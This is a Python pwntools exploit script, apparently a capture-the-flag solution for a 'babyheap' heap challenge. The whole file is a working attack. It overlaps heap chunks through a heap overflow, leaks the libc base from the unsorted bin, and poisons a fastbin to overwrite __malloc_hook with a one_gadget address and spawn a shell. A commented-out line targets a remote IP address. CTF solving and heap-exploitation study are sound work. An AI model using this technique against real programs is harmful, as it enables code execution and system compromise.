# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './babyheap/babyheap-patch'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

# 1. Allocate
# 2. Fill
# 3. Free
# 4. Dump
# 5. Exit
# Command:

def alloc(size):
    r.recvuntil("Command:")
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline(str(size))

def fill(id, data):
    r.recvuntil("Command:")
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline(str(id))
    r.recvuntil("Size: ")
    r.sendline(str(len(data)))   
    r.recvuntil("Content: ")
    r.send(data)  
def free(id):
    r.recvuntil("Command:")
    r.sendline("3")
    r.recvuntil("Index: ")
    r.sendline(str(id))

def dump(id):
    r.recvuntil("Command:")
    r.sendline("4")
    r.recvuntil("Index: ")
    r.sendline(str(id))

alloc(0x20) #0
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x80)

free(1)
free(2)

payload = ''
payload += p64(0x0)*5+p64(0x31)
payload +=p64(0x0)*5+p64(0x31)
payload +=p8(0xc0)
fill(0, payload)

payload = ''
payload += p64(0x0)*5+p64(0x31)
fill(3, payload)
alloc(0x20) #1
alloc(0x20) #2

payload = p64(0x0)*5+p64(0x91)
fill(3, payload)
alloc(0x80) # ..?
free(4)

dump(2)
r.recv(10)
raw = r.recv(6).ljust(8, "\x00")
libc_base = u64(raw) -0x3c4b78
print("libc_base: ", hex(libc_base))

alloc(0x68) # 4
free(4)#???

fill(2, p64(libc_base+0x3c4aed))
alloc(0x60) #trig 4 
alloc(0x60) # trig 6

payload = 'A'*0x13
# 0x45216,0x4526a ,0xf02a4,0xf1147
payload += p64(libc_base+0x4526a)
fill(6, payload)
alloc(1)

print(str(r.proc.pid))
gdb.attach(r, """
heap
x/50gx 0x555555757000
""");
print(str(r.proc.pid))

r.interactive()

